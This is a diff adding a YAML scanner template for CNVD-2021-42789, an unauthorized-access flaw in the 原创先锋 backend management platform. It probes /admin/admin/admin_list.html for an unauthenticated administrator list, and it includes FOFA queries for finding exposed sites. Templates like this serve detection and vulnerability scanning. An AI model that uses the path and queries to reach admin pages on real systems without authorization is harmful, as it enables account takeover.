@@ -1,0 +1,22 @@
+id: CNVD-2021-42789
+
+info:
+  name: 原创先锋 后台管理系统存在未授权访问漏洞CNVD-2021-42789
+  author: daffainfo
+  severity: medium
+  description: |
+    原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限
+    fofa-query: body="https://www.bjycxf.com"
+    fofa-query: icon_hash="-692947551"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B%20%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/admin/admin_list.html
+    expression: response.status == 200 && response.body.bcontains(b'添加') && response.body.bcontains(b'首页') && response.body.bcontains(b'管理员列表') && response.body.bcontains(b'导航元素')
+expression: r0()
